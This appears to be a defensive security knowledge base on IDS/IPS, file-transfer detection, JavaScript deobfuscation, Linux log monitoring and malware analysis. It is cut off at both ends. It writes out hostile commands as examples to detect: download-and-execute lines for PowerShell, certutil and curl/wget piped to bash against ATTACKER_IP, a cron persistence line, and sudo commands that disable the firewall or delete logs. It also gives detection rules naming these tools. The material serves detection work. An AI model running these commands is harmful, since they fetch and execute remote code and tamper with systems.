Technique Description Fragmentation Splitting payloads across packets Encoding Obfuscating strings or payloads Encryption Hiding content inside encrypted channels Protocol tunneling Hiding traffic inside allowed protocols Low-and-slow scanning Reducing scan speed to avoid thresholds User-Agent changes Making traffic look like normal browsers Payload modification Changing exploit patterns to avoid signatures

This is why detection should not rely on one rule or one tool.

docs.title: IDS/IPS and SIEM Integration
docs.text:
IDS/IPS alerts become more valuable when forwarded to a SIEM.

The SIEM can correlate IDS/IPS alerts with:

  • Firewall logs
  • Endpoint logs
  • Authentication events
  • DNS logs
  • Proxy logs
  • Cloud logs
  • EDR alerts
  • Vulnerability data

Example correlation:

IDS detects SMB exploit attempt
+
Windows logs show successful logon
+
Endpoint logs show suspicious process execution
=
High-confidence compromise

IDS/IPS alerts are strongest when combined with other telemetry.

docs.title: Example Investigation Workflow
docs.text:
When an IDS/IPS alert fires, an analyst should not immediately assume compromise. The alert must be validated.

A basic workflow:

Step Question Identify alert What rule triggered? Check source Who sent the traffic? Check destination What asset was targeted? Review payload What did the traffic contain? Check context Is the destination vulnerable? Correlate logs Did authentication or process activity follow? Determine impact Was the attack blocked, failed, or successful? Respond Contain, escalate, tune, or close

docs.title: Common Defensive Use Cases
docs.text: IDS/IPS tools help with many defensive operations.

docs.title: Detecting Reconnaissance
docs.text:
A host scans many ports across many systems.

Possible indicators:

  • Many connection attempts
  • Sequential port access
  • Failed connection bursts
  • Nmap-like traffic patterns

docs.title: Detecting Exploitation
docs.text:
An attacker sends a known exploit payload to a vulnerable service.

Possible indicators:

  • Known exploit strings
  • Suspicious HTTP parameters
  • Abnormal SMB traffic
  • Malformed packets

docs.title: Detecting Malware Communication
docs.text:
A compromised host contacts a command-and-control server.

Possible indicators:

  • Repeated beaconing
  • Suspicious domains
  • Strange User-Agent values
  • Connections to known bad IPs
  • Unusual outbound ports

docs.title: Detecting Data Exfiltration
docs.text:
A host sends unusually large amounts of data outside the network.

Possible indicators:

  • Large outbound transfers
  • DNS tunneling
  • Repeated uploads
  • Connections to cloud storage
  • Traffic outside business hours

docs.title: IDS/IPS Limitations
docs.text:
IDS/IPS tools are powerful, but they have limits.

Limitation Explanation Encrypted traffic Payloads may be hidden Alert fatigue Too many alerts can overwhelm analysts False positives Normal traffic may match signatures Evasion Attackers can modify traffic Blind spots Sensors only see traffic that reaches them Lack of context Alerts need asset and user context Performance impact Inline IPS can affect traffic flow

IDS/IPS should be part of a layered defense strategy, not the only control.

docs.title: Best Practices
docs.text:
Strong IDS/IPS deployments follow several best practices.

Practice Why It Matters Keep rules updated Detect newer threats Tune noisy alerts Reduce alert fatigue Monitor internal traffic Detect lateral movement Integrate with SIEM Improve correlation Use asset context Prioritize critical systems Test rules safely Avoid blocking legitimate traffic Review blocked traffic Ensure IPS actions are correct Combine with EDR Cover endpoint visibility gaps

docs.title: Quick Reference
docs.text: Concept Meaning IDS Detects suspicious activity and alerts IPS Detects and blocks suspicious activity Signature detection Matches known attack patterns Anomaly detection Detects abnormal behavior HIDS Host-based intrusion detection NIDS Network-based intrusion detection Inline Traffic passes through the device Passive Device receives copied traffic False positive Benign activity flagged as malicious False negative Malicious activity missed

docs.title: Key Takeaways
docs.text:
An IDS detects suspicious activity and alerts defenders.

An IPS can actively block or drop malicious traffic.

IDS/IPS tools are useful for detecting scans, exploits, malware callbacks, brute force, lateral movement, and exfiltration.

Tuning is essential because noisy alerts can overwhelm analysts.

Encrypted traffic and attacker evasion techniques limit what IDS/IPS tools can see.

IDS/IPS works best when integrated with SIEM, endpoint logs, firewall logs, DNS logs, and asset context.

docs.title: Executive Summary
docs.text: Threat detection focuses on identifying malicious behavior across endpoints, networks, web applications, and security logs.

docs.title: Topics
docs.text:
• Windows Attacks and Defense — Common Windows attack techniques and defensive controls.
  • Windows Security Monitoring — Windows telemetry, event IDs, and detection logic.
  • Linux Security Monitoring — Linux logs, authentication events, services, and suspicious behavior.
  • Web Security Monitoring — Web logs, attack patterns, suspicious requests, and application abuse.
  • File Transfer Detection — Suspicious downloads, uploads, User-Agent anomalies, and living-off-the-land file movement.
  • Malware Concepts — Malware types, behaviors, indicators, and analysis basics.
  • Malware Analysis — Static and dynamic analysis methods for understanding suspicious files.
  • JavaScript Deobfuscation — Reading and unpacking obfuscated JavaScript used in attacks.

docs.title: Executive Summary
docs.text:
File transfer detection focuses on identifying suspicious movement of tools, payloads, scripts, and data across endpoints and networks.

Attackers and testers often use native tools such as PowerShell, certutil, BITS, curl, wget, SMB, FTP, Netcat, and scripting languages to move files. These methods may look like normal administration unless defenders monitor process behavior, command lines, network connections, and unusual User-Agent strings.

docs.title: Detection Goals
docs.text:
Defenders should identify file transfer activity that is unusual for the user, host, or environment.

High-value indicators include:

  • Downloads from unknown external IP addresses.
  • Executable files downloaded into temporary or writable directories.
  • PowerShell retrieving content from the internet.
  • Use of living-off-the-land binaries for downloads.
  • Unexpected SMB, FTP, HTTP, or HTTPS transfers.
  • Large outbound uploads from sensitive systems.
  • Command-line tools using browser-like User-Agent strings.
  • File download followed quickly by execution.

docs.title: Common Transfer Methods to Monitor
docs.text: Method Common Use Detection Focus PowerShell Download scripts or payloads Web requests, encoded commands, suspicious flags Certutil Download or decode files External connections, urlcache, file writes BITS Background downloads New jobs, external URLs, unusual destinations SMB Internal file movement New shares, admin shares, lateral movement FTP Simple upload/download Cleartext credentials, unusual destinations Curl / Wget Linux downloads Direct IP requests, unusual ports Netcat / Ncat Raw TCP transfer Unusual listeners, raw connections SCP SSH file transfer Unusual SSH destinations Python HTTP server Temporary hosting New listening web server on workstation RDP drive mounting Manual file movement Drive redirection and copy events

docs.title: Windows Indicators
docs.text:
Suspicious Windows activity may include:

  • powershell.exe downloading remote content.
  • certutil.exe connecting to non-certificate-related domains.
  • bitsadmin.exe or BITS jobs pulling files from unknown sources.
  • cmd.exe spawning transfer utilities.
  • Office applications spawning shells or download commands.
  • Files saved to C:\Users\Public\, %TEMP%, or user download paths.
  • Script interpreters creating executable files.
  • RDP sessions using redirected drives.

docs.title: PowerShell Download Detection
docs.text:
PowerShell is frequently used for web downloads and fileless execution.

Common suspicious patterns:

Invoke-WebRequest
Invoke-RestMethod
DownloadString
DownloadFile
IEX
-WebClient
-EncodedCommand

Example suspicious command:

IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')

Useful telemetry:

  • PowerShell Script Block Logging
  • PowerShell Module Logging
  • Process command-line logs
  • Network connections from powershell.exe
  • File creation events after web requests

docs.title: Certutil Detection
docs.text:
certutil.exe is a legitimate Windows binary often abused for file downloads and decoding.

Suspicious patterns:

certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
certutil -decode encoded.txt output.exe

Detection ideas:

  • Alert when certutil.exe connects to external IP addresses.
  • Alert on certutil writing executable files.
  • Alert on -urlcache, -split, -f, or -decode usage outside admin workflows.

docs.title: BITS Detection
docs.text:
BITS is used by Windows for background transfers, but it can also be abused to download payloads.

Suspicious patterns:

Start-BitsTransfer

bitsadmin /transfer

Detection ideas:

  • Monitor new BITS jobs.
  • Alert on BITS jobs to unknown domains or direct IPs.
  • Look for BITS activity followed by process execution.
  • Review HEAD followed by GET requests from BITS User-Agents.

docs.title: Suspicious User-Agent Strings
docs.text:
HTTP User-Agent strings can reveal the tool used for the transfer.

Tool Example User-Agent PowerShell WindowsPowerShell/5.1 Certutil Microsoft-CryptoAPI BITS Microsoft BITS WinHTTP COM object WinHttp.WinHttpRequest Old XMLHTTP COM object MSIE 7.0-style strings Curl curl/7.x Wget Wget/1.x Python Requests python-requests

Suspicious signs include:

  • Command-line User-Agents from normal workstations.
  • Old browser User-Agents on modern systems.
  • Browser-like User-Agents used by non-browser processes.
  • Rare User-Agents contacting unknown destinations.

docs.title: Linux Indicators
docs.text:
Suspicious Linux activity may include:

  • curl or wget downloading executable scripts.
  • Shell piping remote content directly into bash.
  • Python starting an HTTP server.
  • Netcat or Socat creating listeners.
  • SCP transfers from sensitive directories.
  • Files downloaded into /tmp, /dev/shm, or user-writable paths.
  • Archive files created before outbound transfer.

Suspicious examples:

curl http://ATTACKER_IP/script.sh | bash

wget -qO- http://ATTACKER_IP/script.py | python3

python3 -m http.server 8000

docs.title: Endpoint Indicators
docs.text:
Endpoint logs can show how the transfer happened.

Look for:

  • Parent-child process relationships.
  • Shells spawning transfer tools.
  • Web clients writing executable files.
  • Recently created files followed by execution.
  • Unusual processes opening network connections.
  • Encoded commands.
  • Temporary files with executable extensions.
  • Archive tools used before upload.

High-risk parent processes include:

  • Microsoft Office applications
  • Web server processes
  • Database services
  • Browser processes spawning shells
  • Scripting engines
  • Remote management tools

docs.title: Network Indicators
docs.text:
Network telemetry can reveal suspicious movement even when endpoint visibility is limited.

Look for:

  • Direct IP downloads.
  • Unusual outbound ports.
  • Temporary HTTP servers.
  • Large outbound uploads.
  • Connections to rare domains.
  • Repeated failed download attempts.
  • New connections from servers that rarely browse the internet.
  • HTTP traffic from command-line User-Agents.
  • Internal systems transferring files over SMB unexpectedly.

docs.title: File Creation Indicators
docs.text:
Suspicious file writes include:

  • Executables in temporary directories.
  • Scripts in user profile paths.
  • Archives created in sensitive directories.
  • Files with double extensions.
  • Recently downloaded DLLs.
  • Tools written shortly before execution.
  • Payloads saved under misleading names.

Common paths to monitor:

C:\Users\Public\
C:\Windows\Temp\
C:\Users\<user>\AppData\Local\Temp\
/tmp
/dev/shm
/var/tmp
/home/<user>/Downloads

docs.title: Detection Logic Examples
docs.text:
PowerShell downloading from the internet:

process.name = powershell.exe
AND command_line contains any of:
Invoke-WebRequest, Invoke-RestMethod, DownloadString, DownloadFile, WebClient

Certutil downloading content:

process.name = certutil.exe
AND command_line contains any of:
-urlcache, -split, -f, http

Linux remote script execution:

process.name in (bash, sh)
AND command_line contains any of:
curl, wget
AND command_line contains "|"

Python temporary web server:

process.name = python OR process.name = python3
AND command_line contains "http.server"

Command-line User-Agent from workstation:

http.user_agent contains any of:
WindowsPowerShell, Microsoft-CryptoAPI, Microsoft BITS, curl, Wget, python-requests

docs.title: Investigation Workflow
docs.text: Phase Questions Identify What file was transferred and where did it come from? Validate Was the transfer expected for this user or system? Scope Did other hosts download the same file? Timeline Was the file executed after download? Ownership Which process and user initiated the transfer? Destination Was the remote host trusted, known, or suspicious? Impact Did the transferred file create persistence, credentials access, or lateral movement?

docs.title: Defensive Controls
docs.text:
Useful controls include:

  • PowerShell Script Block Logging.
  • Command-line process auditing.
  • Proxy and firewall logging.
  • DNS logging.
  • EDR file creation monitoring.
  • Egress filtering.
  • Application allowlisting.
  • Blocking unnecessary outbound protocols.
  • Restricting direct internet access from servers.
  • Disabling unused tools where practical.
  • Alerting on known LOLBAS transfer methods.

docs.title: Tuning Considerations
docs.text:
Not all file transfers are malicious.

Common legitimate sources include:

  • Software deployment tools.
  • Patch management.
  • Backup systems.
  • Administrator scripts.
  • Developer workflows.
  • Monitoring agents.
  • Cloud sync clients.

Tune detections by considering:

  • User role.
  • Host role.
  • Destination reputation.
  • Parent process.
  • File type.
  • Transfer frequency.
  • Time of day.
  • Whether execution followed the transfer.

docs.title: Defensive Summary
docs.text:
File transfer activity becomes suspicious when the method, destination, file type, parent process, or timing does not match normal behavior.

Strong detections combine endpoint telemetry, network logs, proxy data, DNS records, and file creation events instead of relying on one signal alone.

docs.title: JavaScript Deobfuscation
docs.text:
JavaScript deobfuscation is the process of turning unreadable or intentionally hidden JavaScript back into a form that analysts can understand.

It is useful for investigating malicious redirects, web skimmers, browser exploits, phishing kits, and suspicious scripts found on compromised websites.

docs.title: Why JavaScript Is Obfuscated
docs.text:
JavaScript obfuscation is used for both legitimate and malicious reasons.

Use Description Legitimate Reduce file size, protect intellectual property Malicious Hide payloads, C2 domains, skimmers, redirects, or exploit logic

Common targets for analysis:

  • Injected website scripts
  • Minified .js files
  • Suspicious browser redirects
  • Magecart-style skimmers
  • Obfuscated phishing pages
  • Packed JavaScript payloads

docs.title: Minification
docs.text:
Minification removes unnecessary characters without changing functionality.

Removed content often includes:

  • Spaces
  • Newlines
  • Comments
  • Long variable names
  • Formatting

Example characteristics:

One long line
Very short variable names
No comments
No indentation

Minification makes code harder to read, but it does not necessarily hide the logic deeply.

docs.title: Beautification
docs.text:
Beautification, or pretty printing, restores formatting.

It adds:

  • Newlines
  • Indentation
  • Function structure
  • Readable blocks

Beautification does not decode encrypted or packed logic. It only makes the visible structure easier to inspect.

Useful tools:

Tool Use Browser DevTools Pretty Print Format loaded scripts Prettier Format JavaScript JS Beautifier Format JavaScript Code editor formatters Local safe formatting

docs.title: Browser DevTools Pretty Print
docs.text:
Most browsers can pretty print minified JavaScript.

General workflow:

  1. Open Developer Tools.
  2. Go to the Sources or Debugger tab.
  3. Select the suspicious script.
  4. Click the { } pretty print button.
  5. Review function names, strings, URLs, and execution flow.

This is useful for scripts already loaded in the browser.

docs.title: Packing
docs.text:
Packing hides code more deeply than minification.

Packed JavaScript usually contains:

  • Encoded payload
  • Dictionary of strings
  • Runtime unpacker
  • Final execution sink such as eval()

The script reconstructs the real code in memory and then executes it.

docs.title: The p,a,c,k,e,d Packer
docs.text:
A common JavaScript packer uses a function with arguments similar to:

eval(function(p,a,c,k,e,d){ ... })

This is often associated with Dean Edwards-style packing.

Argument Meaning p Encoded payload a Base/radix c Keyword count k Keyword dictionary e Encoder/helper d Runtime dictionary object

This pattern is a strong signal that the script is packed.

docs.title: How Packed JavaScript Works
docs.text:
Typical flow:

Original JavaScript
  -> Extract keywords
  -> Build dictionary
  -> Replace words with encoded indexes
  -> Wrap in unpacker function
  -> Execute unpacker in browser
  -> Pass decoded code to eval()

The original logic is hidden until runtime.

docs.title: Execution Sinks
docs.text:
Execution sinks dynamically run strings as JavaScript.

Common sinks:

eval()
Function()
setTimeout("code", delay)
setInterval("code", delay)

Security relevance:

  • Obfuscated malware often reconstructs code as a string.
  • The final string is passed into one of these functions.
  • Analysts often intercept this step to print the decoded code instead of running it.

docs.title: Safe Manual Unpacking Concept
docs.text:
A common analysis technique is to replace the final execution sink with output.

Conceptually:

eval(decoded_payload)

becomes:

console.log(decoded_payload)

This allows the analyst to view the decoded JavaScript without executing it.

Warning

Only do this in an isolated analysis environment. Obfuscated JavaScript may contain browser exploits or credential theft logic.

docs.title: Deobfuscation Workflow
docs.text:
Recommended process:

Identify suspicious script
  -> Beautify
  -> Look for eval/Function/setTimeout
  -> Identify packer pattern
  -> Unpack or intercept decoded output
  -> Beautify decoded payload
  -> Repeat if multiple layers exist
  -> Extract IOCs and behavior

docs.title: What to Look For
docs.text:
During analysis, search for:

  • Domains
  • IP addresses
  • URLs
  • Form field names
  • Payment fields
  • Cookie access
  • Local storage access
  • External script loads
  • XMLHttpRequest
  • fetch
  • document.cookie
  • atob
  • btoa
  • eval
  • Function
  • setTimeout
  • String.fromCharCode

docs.title: Common Malicious JavaScript Behaviors
docs.text: Behavior Possible Indicator Credential theft Reads login form fields Web skimming Reads card/payment fields Redirect Changes window.location C2 polling Repeated fetch or XHR Cookie theft Reads document.cookie Payload staging Loads external script dynamically Anti-analysis Checks browser/devtools/timing

docs.title: Detection Opportunities
docs.text:
Defenders can monitor for:

  • Heavy obfuscation
  • Long encoded strings
  • eval(function(p,a,c,k,e,d)
  • eval(atob(...))
  • Suspicious external script loads
  • JavaScript injected into CMS templates
  • Unexpected changes to production JS files
  • Checkout pages loading rare third-party domains

docs.title: Content Security Policy
docs.text:
Content Security Policy can reduce risk.

Useful restrictions:

Disallow unsafe-eval
Restrict script-src
Restrict external domains
Block inline scripts where possible

Example concept:

Content-Security-Policy: script-src 'self' https://trusted-cdn.example;

Avoid allowing:

'unsafe-eval'
'unsafe-inline'
*

docs.title: Analysis Safety
docs.text:
Best practices:

  • Use an isolated VM.
  • Prefer offline tools.
  • Avoid pasting sensitive production code into random online tools.
  • Do not execute unknown scripts in your main browser.
  • Capture IOCs before interacting with live infrastructure.
  • Record the original script hash and source URL.

docs.title: Quick Reference
docs.text: Task Tool / Technique Format minified code Beautifier / Prettier / DevTools { } Identify packer Look for eval(function(p,a,c,k,e,d) Unpack payload Dedicated unpacker or intercept eval() Extract IOCs Search URLs, domains, cookies, form fields Prevent execution CSP without unsafe-eval Analyze safely Isolated VM or offline tooling

docs.title: Notes to Remember
docs.text:
• Beautification restores readability but does not decode hidden logic.
  • Packing reconstructs the real code at runtime.
  • eval() is a major execution sink.
  • Replacing eval() with output is a common unpacking technique.
  • Multiple obfuscation layers may require repeated analysis.

docs.title: Linux Security Monitoring
docs.text:
Linux security monitoring focuses on collecting and analyzing logs, process activity, file changes, authentication events, and command execution to detect compromise.

Linux servers are common targets because they host web applications, databases, cloud workloads, and infrastructure services.

docs.title: Linux Logging Basics
docs.text:
Linux logs are usually plain text files.

Common location:

/var/log/

Typical log format:

Timestamp Hostname Process[PID]: Message

Unlike Windows logs, Linux logs usually do not have universal event IDs.

docs.title: Key Linux Log Files
docs.text: File Purpose /var/log/syslog General system log on Debian/Ubuntu /var/log/messages General system log on RHEL/CentOS /var/log/auth.log Authentication logs on Debian/Ubuntu /var/log/secure Authentication logs on RHEL/CentOS /var/log/kern.log Kernel logs /var/log/dpkg.log Debian package install/removal logs /var/log/yum.log RHEL/CentOS package logs /var/log/cron Scheduled task logs /var/log/nginx/access.log Nginx web access /var/log/apache2/access.log Apache web access

docs.title: Working with Logs
docs.text:
Read a log:

cat /var/log/syslog

First lines:

head /var/log/syslog

Last lines:

tail /var/log/syslog

Follow live:

tail -f /var/log/syslog

docs.title: Filtering with Grep
docs.text:
Filter for a keyword:

grep "CRON" /var/log/syslog

Exclude a keyword:

grep -v "CRON" /var/log/syslog

Recursive search:

grep -R -E "auth|login|session" /var/log

Search compressed rotated logs:

zgrep "Failed password" /var/log/auth.log*.gz

docs.title: Log Rotation
docs.text:
Logs may rotate into older files.

Examples:

auth.log
auth.log.1
auth.log.2.gz
syslog
syslog.1
syslog.2.gz

Use tools like:

zcat
zgrep
zless

docs.title: Authentication Logs
docs.text:
Authentication logs are critical for detecting:

  • SSH brute force
  • Successful compromise
  • Sudo usage
  • User creation
  • Group modification
  • Password changes
  • Privilege escalation attempts

Debian/Ubuntu:

/var/log/auth.log

RHEL/CentOS:

/var/log/secure

docs.title: SSH Monitoring
docs.text:
Successful SSH logins:

grep "sshd" /var/log/auth.log | grep "Accepted"

Failed SSH logins:

grep "sshd" /var/log/auth.log | grep "Failed"

Invalid users:

grep "Invalid user" /var/log/auth.log

Brute-force pattern:

Many "Failed password" events from one IP
  -> followed by "Accepted password"

docs.title: Session Events
docs.text:
Find opened and closed sessions:

grep -E "session opened|session closed" /var/log/auth.log

Common sources:

Source Meaning sshd Remote SSH login login Local login sudo Elevated command su Switch user cron Scheduled task

docs.title: User and Group Changes
docs.text:
Find account changes:

grep -E "useradd|userdel|usermod|groupadd|groupdel" /var/log/auth.log

Red flags:

  • Unexpected user creation
  • User added to sudo
  • Root password changed
  • Disabled account re-enabled
  • Service-looking user created after compromise

docs.title: Sudo Command Auditing
docs.text:
Sudo logs the command executed.

Search:

grep "COMMAND=" /var/log/auth.log

Suspicious examples:

COMMAND=/usr/bin/systemctl stop ufw
COMMAND=/usr/bin/rm -rf /var/log/auth.log
COMMAND=/usr/bin/chmod +s /bin/bash

docs.title: Web Server Logs
docs.text:
Web logs help detect:

  • SQL injection
  • Path traversal
  • Web shells
  • Directory brute forcing
  • Authentication attacks
  • DoS/DDoS
  • Suspicious uploads

Nginx access log example:

10.0.4.99 - - [11/08/2025:17:11:20 +0000] "GET /images/logo.png HTTP/1.1" 200 5432

Fields:

Field Meaning Source IP Requester Timestamp Time of request Method/path Requested resource Status code Result Size Bytes returned

docs.title: Bash History
docs.text:
Bash history records interactive commands.

View saved history:

cat ~/.bash_history

View current shell history:

history

Limitations:

  • Commands with leading spaces may not be logged.
  • Commands inside scripts are not individually logged.
  • Attackers can clear history.
  • Other shells may not log the same way.
  • History writes on session close, not always instantly.

Warning

Bash history is useful but not reliable as a complete forensic record.

docs.title: Auditd
docs.text:
Auditd is the Linux audit daemon.

It monitors kernel-level activity through syscalls.

Useful for:

  • Process execution
  • File access
  • File modification
  • Privileged actions
  • Sensitive file monitoring
  • Runtime detection
  • File integrity monitoring

Audit logs:

/var/log/audit/audit.log

docs.title: Auditd Rules
docs.text:
Rules define what to watch.

Common monitoring targets:

  • /etc/passwd
  • /etc/shadow
  • /etc/sudoers
  • /etc/ssh/sshd_config
  • /home/*/.ssh/authorized_keys
  • /etc/crontab
  • /etc/cron.d/
  • /etc/systemd/system/
  • /var/www/
  • Execution of wget, curl, nc, bash, python

docs.title: Searching Audit Logs
docs.text:
Use ausearch.

Search by key:

ausearch -i -k proc_wget

Search by executable:

ausearch -i -x wget

Search by file:

ausearch -i -f /etc/ssh/sshd_config

Search by PID:

ausearch -i --pid <PID>

Search by parent PID:

ausearch -i --ppid <PPID>

docs.title: Important Audit Fields
docs.text:
Field Meaning pid Process ID ppid Parent process ID auid Original login user uid Effective user exe Executable path proctitle Full command key Rule tag syscall Kernel action

auid is very important because it can preserve the original user even after sudo.

docs.title: Linux Discovery Detection
docs.text:
After gaining access, attackers usually run discovery commands.

Common commands:

Category Commands Identity whoami, id, w, last System uname -a, hostname, lsb_release -a, env Users cat /etc/passwd, cat /etc/sudoers Processes ps aux, top Network ip a, netstat -tnlp, ss -tnlp Virtualization systemd-detect-virt, lsmod

High-confidence signal:

www-data -> bash -> whoami

Web server users rarely need to spawn shells and run discovery commands.

docs.title: Process Tree Investigation
docs.text:
When investigating suspicious command execution:

  1. Find the suspicious child process.
  2. Get the parent process ID.
  3. Investigate the parent.
  4. Investigate sibling processes from the same parent.

Example:

ausearch -i -x whoami
ausearch -i --pid <PPID>
ausearch -i --ppid <PPID>

Suspicious patterns:

/tmp/lp.sh -> whoami
www-data -> bash -> id
apache -> sh -> curl

docs.title: Privilege Escalation Monitoring
docs.text:
Attackers often land as low-privilege users and attempt to become root.

Common phases:

Phase Indicators Discovery whoami, id, uname -r Staging wget, curl, files in /tmp Compilation gcc exploit.c Execution Running exploit binary Impact UID changes to root

Reliable indicator:

UID changes from normal user to root without legitimate sudo path

docs.title: Privilege Escalation Investigation
docs.text:
Find exploit execution:

ausearch -i -x pwnkit

Trace parent:

ausearch -i --pid <Exploit_PPID>

Trace child:

ausearch -i --ppid <Exploit_PID>

Look for root shell spawned by suspicious process.

docs.title: Linux Persistence
docs.text:
Common Linux persistence mechanisms:

Technique Location Cron job /etc/crontab, /etc/cron.d/, /var/spool/cron/ Systemd service /etc/systemd/system/, /lib/systemd/system/ SSH key ~/.ssh/authorized_keys New user /etc/passwd, /etc/shadow Web shell /var/www/, app upload directories Shell profile .bashrc, .profile, /etc/profile

docs.title: Cron Persistence
docs.text:
Attackers may add jobs like:

@reboot /tmp/payload
*/10 * * * * curl http://attacker/p.sh | bash

Hunt:

ausearch -i -x crontab
ausearch -i -f /etc/crontab
ausearch -i -f /etc/cron.d/

docs.title: Systemd Persistence
docs.text:
Attackers may create fake services.

Suspicious paths:

/etc/systemd/system/*.service
/lib/systemd/system/*.service

Hunt:

ausearch -i -f /etc/systemd/system/
grep -R "ExecStart" /etc/systemd/system/

Watch for:

  • Odd service names
  • Services running from /tmp
  • Services running curl/bash pipelines
  • Newly enabled services
  • Masquerading as cloud or update services

docs.title: Account Persistence
docs.text:
Attackers may create users or add SSH keys.

Find user creation:

grep -E "useradd|usermod" /var/log/auth.log

Check suspicious users:

cat /etc/passwd

Find sudo-capable users:

getent group sudo
getent group wheel

docs.title: SSH Key Backdoors
docs.text:
Attackers may append their public key to:

~/.ssh/authorized_keys

Auditd search:

ausearch -i -f /home/user/.ssh/authorized_keys

Manual hunt:

find /home -name authorized_keys -type f -exec ls -la {} \;
find /home -name authorized_keys -type f -exec cat {} \;

docs.title: Web Shell Persistence
docs.text:
Web shells provide application-level persistence.

Hunt:

find /var/www -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" \)
grep -R "system(" /var/www
grep -R "shell_exec" /var/www
grep -R "base64_decode" /var/www

Look for:

  • New PHP files in upload folders
  • Random names
  • Double extensions
  • Dangerous functions
  • Recent modifications

docs.title: Auditd Alternatives
docs.text: Tool Best For Sysmon for Linux Teams using Sysmon-style telemetry Falco Containers and Kubernetes runtime detection Osquery Querying system state like SQL EDR Enterprise endpoint detection and response

docs.title: Quick Reference
docs.text: Goal Command Successful SSH grep "Accepted" /var/log/auth.log Failed SSH grep "Failed password" /var/log/auth.log Invalid users grep "Invalid user" /var/log/auth.log Sudo commands grep "COMMAND=" /var/log/auth.log User changes grep -E "useradd|usermod|userdel" /var/log/auth.log Search all logs grep -R -E "keyword1|keyword2" /var/log Audit by executable ausearch -i -x <binary> Audit by file ausearch -i -f <path> Audit by key ausearch -i -k <key> Trace parent ausearch -i --pid <PPID> Trace siblings ausearch -i --ppid <PPID>

docs.title: Notes to Remember
docs.text:
• Linux logs are mostly plain text.
  • /var/log/auth.log or /var/log/secure is critical for authentication.
  • Bash history is helpful but easy to evade.
  • Auditd gives syscall-level visibility.
  • Process tree context is essential.
  • www-data running whoami, id, bash, or curl is highly suspicious.
  • Persistence often uses cron, systemd, SSH keys, new users, or web shells.

docs.title: Malware Analysis
docs.text:
Malware analysis is the process of examining suspicious files or behavior to understand what the malware is, what it does, how it persists, how it communicates, and how to detect it.

Malware analysis usually combines static analysis, dynamic analysis, reverse engineering, and detection engineering.

docs.title: Analysis Goals
docs.text:
Malware analysis helps answer:

  • What type of file is this?
  • Is it packed or obfuscated?
  • What capabilities does it have?
  • Does it persist?
  • Does it contact C2 infrastructure?
  • Does it inject into other processes?
  • What files, registry keys, or services does it create?
  • What indicators can we turn into detections?

docs.title: Analysis Types
docs.text: Type Description Risk Static analysis Analyze without running the sample Lower Dynamic analysis Execute in a controlled lab and observe behavior Higher Reverse engineering Inspect disassembly or debug the program Medium to high Detection engineering Convert findings into YARA/Sigma/SIEM rules Low

docs.title: Windows Internals for Malware Analysis
docs.text:
To analyze Windows malware, understand the environment it runs in.

Windows separates execution into:

Mode Description Malware Relevance User mode Restricted mode where applications run Most malware starts here Kernel mode Privileged mode where drivers and the OS kernel run Rootkits and advanced malware may target this

docs.title: User Mode
docs.text:
User mode includes:

  • User applications
  • Browsers
  • Office applications
  • Service processes
  • Logon-related processes
  • Malware running with normal user privileges

User-mode malware commonly interacts with:

  • Files
  • Registry keys
  • Processes
  • Services
  • Network APIs
  • User credentials available to the session

docs.title: Kernel Mode
docs.text:
Kernel mode includes:

  • Windows kernel
  • Device drivers
  • Hardware Abstraction Layer
  • Kernel-level security components

Kernel-mode malware is dangerous because it can:

  • Hide files
  • Hide processes
  • Intercept security tools
  • Manipulate memory
  • Resist removal
  • Tamper with system behavior

docs.title: Windows API Call Flow
docs.text:
User-mode programs request privileged actions through Windows APIs.

Example flow for a memory-related API:

Malware calls Windows API
  -> kernel32.dll
  -> ntdll.dll
  -> syscall instruction
  -> kernel mode
  -> SSDT lookup
  -> permission checks
  -> result returned to user mode

Important components:

Component Purpose kernel32.dll Common Windows API layer ntdll.dll Low-level interface to syscalls syscall CPU transition from user mode to kernel mode SSDT System Service Descriptor Table Kernel Performs privileged operation

docs.title: Portable Executable Format
docs.text:
Windows executables and DLLs commonly use the PE format.

Common file types:

.exe
.dll
.sys
.scr

docs.title: PE Sections
docs.text: Section Purpose Analysis Value .text Executable code Main program logic .data Writable variables Runtime data .rdata Read-only data Strings and constants .rsrc Resources Icons, dialogs, embedded payloads .idata Imports API capabilities .edata Exports DLL-provided functions .reloc Relocation data Memory loading support

docs.title: Process Anatomy
docs.text:
A process is a container for execution.

Important components:

Component Description PID Process ID Virtual Address Space Process memory Threads Actual execution units Handles References to files, registry keys, processes, etc. Access Token Security context and privileges

docs.title: Imports and Exports
docs.text:
Imports show which external functions a program uses.

Examples:

Import Possible Meaning CreateFile File creation/access WriteFile Write data to disk InternetOpenUrl Network download RegOpenKeyEx Registry access VirtualAllocEx Allocate memory in another process WriteProcessMemory Write into another process CreateRemoteThread Execute code in another process

Exports are functions a DLL makes available to other programs.

docs.title: Process Injection Indicators
docs.text:
A common process injection pattern:

OpenProcess
  -> VirtualAllocEx
  -> WriteProcessMemory
  -> CreateRemoteThread

This may indicate one process is writing code into another process and forcing it to execute.

Common injection targets:

  • notepad.exe
  • explorer.exe
  • svchost.exe
  • Browser processes
  • Office processes

docs.title: Static Analysis
docs.text:
Static analysis means examining a sample without executing it.

Common goals:

  • Identify file type
  • Calculate hashes
  • Extract strings
  • Inspect imports
  • Inspect PE sections
  • Detect packing
  • Extract embedded files
  • Identify possible capabilities

docs.title: Identify File Type
docs.text:
Use file:

file sample.exe

Example output:

PE32 executable (GUI) Intel 80386, for MS Windows

docs.title: Verify Header
docs.text:
Windows PE files begin with MZ.

hexdump -C sample.exe | head

Look for:

4d 5a
MZ

docs.title: Hashing
docs.text:
Hashes identify exact files.

md5sum sample.exe
sha256sum sample.exe
Hash Use MD5 Legacy lookup SHA256 Preferred IOC hash

docs.title: Similarity Hashing
docs.text:
Standard hashes change completely when one byte changes. Similarity hashing helps identify related samples.

Method Purpose IMPHASH Hashes imported APIs SSDEEP Fuzzy file similarity Section hash Hashes individual PE sections

SSDEEP example:

ssdeep sample.exe

docs.title: String Analysis
docs.text:
Extract readable strings:

strings -n 15 sample.exe

Look for:

  • URLs
  • IP addresses
  • Domains
  • File paths
  • Registry paths
  • PDB paths
  • Error messages
  • User-Agent strings
  • Commands

docs.title: FLOSS
docs.text:
FLOSS extracts obfuscated strings and stack strings.

floss sample.exe

Use FLOSS when basic strings produces limited output.

docs.title: Packing
docs.text:
Packing compresses or encrypts malware to make static analysis harder.

Signs of packing:

  • Few imports
  • High entropy
  • Section names like UPX0, UPX1
  • Very few readable strings
  • Suspicious section permissions

UPX unpacking:

